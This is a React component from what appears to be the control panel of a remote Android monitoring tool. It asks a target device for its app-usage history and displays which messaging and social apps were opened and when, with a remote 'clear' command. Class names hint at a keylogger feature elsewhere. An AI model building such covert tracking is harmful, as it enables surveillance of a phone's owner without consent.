import React, { useState, useEffect, useCallback, useRef, useMemo } from 'react';
import { formatDateTime, formatDate } from '../utils/dateTime.js';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
};

function getAppColor(pkg) {
  if (!pkg) return '#7c3aed';
  return APP_COLORS[pkg] || '#' + Math.abs(pkg.split('').reduce((h, c) => (h << 5) - h + c.charCodeAt(0), 0) % 0xFFFFFF).toString(16).padStart(6, '7');
}

function friendlyPkg(pkg) {
  if (!pkg) return 'Unknown';
  const known = {
    'com.whatsapp': 'WhatsApp',
    'com.instagram.android': 'Instagram',
    'com.facebook.katana': 'Facebook',
    'org.telegram.messenger': 'Telegram',
    'com.snapchat.android': 'Snapchat',
    'com.zhiliaoapp.musically': 'TikTok',
    'com.twitter.android': 'Twitter/X',
    'com.facebook.orca': 'Messenger',
    'com.google.android.gm': 'Gmail',
    'com.android.chrome': 'Chrome',
    'com.google.android.youtube': 'YouTube',
    'com.google.android.apps.maps': 'Maps',
  };
  return known[pkg] || pkg.split('.').pop();
}

export default function RecentActivityTab({ device, activityEntries, sendCommand, results }) {
  const deviceId  = device.deviceId;
  const isOnline  = device.isOnline;

  const [storedActivity, setStoredActivity] = useState([]);
  const [filter, setFilter] = useState('');
  const [loading, setLoading] = useState(false);
  const seenResultIds = useRef(new Set());

  // Handle get_activity command results from the device
  useEffect(() => {
    const relevant = results.filter(r =>
      r.command === 'get_activity' &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenResultIds.current.has(r.id)) return;
      seenResultIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (data.activities && Array.isArray(data.activities)) {
          setStoredActivity(data.activities);
        }
      } catch (_) {}
    });
  }, [results]);

  // Load the device's persisted activity as soon as this tab is opened.
  useEffect(() => {
    if (isOnline) sendCommand(deviceId, 'get_activity', { limit: 500 });
  }, [deviceId, isOnline, sendCommand]);

  const fetchActivity = useCallback(() => {
    setLoading(true);
    sendCommand(deviceId, 'get_activity', { limit: 500 });
    setTimeout(() => setLoading(false), 1500);
  }, [deviceId, sendCommand]);

  const combinedActivity = useMemo(() => {
    const seen = new Set();
    return [
      ...(activityEntries || []),
      ...storedActivity,
    ].filter(e => {
      const key = `${e.packageName || ''}|${e.timestamp || ''}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  }, [activityEntries, storedActivity]);

  const filtered = useMemo(() => filter
    ? combinedActivity.filter(e => (e.packageName || '').includes(filter) || (e.appName || '').toLowerCase().includes(filter.toLowerCase()))
    : combinedActivity,
  [combinedActivity, filter]);

  const grouped = [];
  let lastDate = '';
  filtered.forEach(e => {
    const date = formatDate(e.timestamp, '');
    if (date && date !== lastDate) {
      grouped.push({ type: 'date', date });
      lastDate = date;
    }
    grouped.push({ type: 'entry', ...e });
  });

  return (
    <div className="activity-tab">
      <div className="activity-toolbar">
        <div className="activity-title">
          📱 Recent Activity
          <span className="notif-badge">{filtered.length}</span>
        </div>
        <div className="activity-actions">
          <button className="kl-btn" onClick={fetchActivity} disabled={!device.isOnline || loading}>
            {loading ? '…' : '↻ Refresh'}
          </button>
          <button className="kl-btn kl-btn-danger" onClick={() => {
            if (sendCommand) sendCommand(device.deviceId, 'clear_activity', {});
            setStoredActivity([]);
          }} disabled={!device.isOnline}>
            🧹 Clear
          </button>
        </div>
        <input
          className="activity-search"
          placeholder="Filter by app…"
          value={filter}
          onChange={e => setFilter(e.target.value)}
        />
      </div>

      <div className="activity-feed">
        {filtered.length === 0 ? (
          <div className="notif-empty">
            <div style={{ fontSize: 40 }}>📱</div>
            <div>No activity yet</div>
            <div style={{ fontSize: 12, color: '#64748b' }}>
              {device.isOnline ? 'Watching for app opens…' : 'Device offline'}
            </div>
          </div>
        ) : (
          grouped.map((item, i) => {
            if (item.type === 'date') {
              return (
                <div key={`date-${i}`} className="activity-date-divider">
                  {item.date}
                </div>
              );
            }
            const color = getAppColor(item.packageName);
            const name = item.appName || friendlyPkg(item.packageName);
            return (
              <div key={`${item.packageName}-${item.timestamp}-${i}`} className="activity-entry">
                <div
                  className="activity-app-icon"
                  style={{ background: color + '22', borderColor: color + '55', color }}
                >
                  {name.slice(0, 2).toUpperCase()}
                </div>
                <div className="activity-entry-info">
                  <div className="activity-app-name">{name}</div>
                  <div className="activity-pkg">{item.packageName}</div>
                </div>
                <div className="activity-time">
                  {formatDateTime(item.timestamp)}
                </div>
              </div>
            );
          })
        )}
      </div>
    </div>
  );
}
